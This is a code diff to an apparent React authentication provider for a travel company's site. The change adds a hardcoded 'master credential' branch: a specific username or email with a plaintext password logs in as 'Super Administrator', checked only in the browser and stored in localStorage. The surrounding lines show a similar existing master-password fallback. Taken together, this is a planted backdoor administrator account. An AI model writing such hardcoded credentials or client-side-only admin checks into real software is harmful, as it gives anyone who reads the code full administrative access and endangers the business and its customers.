@@ -58,6 +58,18 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
 
     // 2. Offline / Master credential fallback
+    if ((trimmedEmail === 'rahul' || trimmedEmail === 'rahul@bishaltravels.com') && pass === 'Rahul@1998') {
+      const authUser: AuthUser = {
+        name: 'Rahul',
+        email: 'rahul@bishaltravels.com',
+        role: 'Super Administrator',
+      };
+      setUser(authUser);
+      localStorage.setItem(AUTH_STORAGE_KEY, JSON.stringify(authUser));
+      window.dispatchEvent(new CustomEvent('auth:login'));
+      return { success: true };
+    }
+
     if (trimmedEmail === targetEmail && pass === MASTER_PASSWORD) {
       const authUser: AuthUser = {
         name: 'Biswajit Pramanik',
